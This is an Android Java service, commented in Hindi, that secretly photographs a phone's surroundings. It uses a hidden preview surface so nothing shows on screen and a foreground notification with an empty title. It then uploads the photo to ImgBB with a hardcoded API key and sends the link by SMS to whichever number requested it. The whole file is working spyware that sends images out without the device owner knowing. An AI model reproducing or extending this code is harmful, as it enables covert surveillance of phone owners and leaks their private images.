package com.akash.myapplication;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Build;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

@SuppressWarnings("ALL")
public class CameraService extends Service {

    // ⚠️ यहाँ अपनी ImgBB API Key डालो
    private final String API_KEY = "a2e599e22bc3422560831662ece7e374";
    private String senderNumber = "";
    private String whichCamera = "back";

    @SuppressLint("NewApi")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        senderNumber = intent.getStringExtra("sender");
        whichCamera = intent.getStringExtra("which"); // <--- ये लाइन जोड़ो

        // Notification (Android का नियम)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("x", "x", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (mgr != null) mgr.createNotificationChannel(ch);
        }
        startForeground(1, new Notification.Builder(this, "x").setContentTitle("").setSmallIcon(android.R.drawable.ic_menu_camera).build());

        // थोड़ी देर बाद फोटो खींचो
        new android.os.Handler().postDelayed(this::clickPhoto, 500);

        return START_NOT_STICKY;
    }

    private void clickPhoto() {
        Camera camera = null;
        try {
            int cameraId;
            if (whichCamera.equals("front")) {
                cameraId = Camera.CameraInfo.CAMERA_FACING_FRONT;
            } else {
                cameraId = Camera.CameraInfo.CAMERA_FACING_BACK;
            }
            camera = Camera.open(cameraId);

            // ये स्क्रीन पर कुछ नहीं दिखाता, सिर्फ अंदरूनी तैयारी करता है
            SurfaceTexture fakeSurface = new SurfaceTexture(0);
            camera.setPreviewTexture(fakeSurface);
            camera.startPreview();
            Camera finalCamera = camera;
            new android.os.Handler().postDelayed(() -> {
                try {
                    finalCamera.takePicture(null, null, (data, cam) -> {
                        cam.release();

                        // फोटो खींच ली, अब Background Thread पर Upload करो
                        new Thread(() -> uploadAndSend(data)).start();
                    });
                } catch (Exception e) { finalCamera.release(); stopSelf(); }
            }, 1000);

        } catch (Exception e) { stopSelf(); }
    }

    // ---------- Upload और SMS भेजने का काम ----------
    private void uploadAndSend(byte[] imageData) {
        try {
            // 1. Image को Base64 में बदलो (ताकि server समझ सके)
            String base64Image = Base64.encodeToString(imageData, Base64.NO_WRAP);

            // 2. ImgBB Server से जुड़ो
            URL url = new URL("https://api.imgbb.com/1/upload?key=" + API_KEY);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);

            // 3. Data भेजो
            String postData = "image=" + URLEncoder.encode(base64Image, "UTF-8");
            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(postData);
            os.close();

            // 4. Server का जवाब पढ़ो
            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line, response = "";
            while ((line = br.readLine()) != null) response += line;

            // 5. JSON से Link निकालो
            JSONObject json = new JSONObject(response);
            String link = json.getJSONObject("data").getString("url");

            Log.d("TAG", "Link: " + link);

            // 6. Link SMS से भेजो
            if (senderNumber != null && !senderNumber.isEmpty()) {
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(senderNumber, null, "Pic: " + link, null, null);
            }

        } catch (Exception e) {
            Log.e("TAG", "Error: " + e.getMessage());
        } finally {
            stopSelf(); // काम खत्म, Service बंद
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

}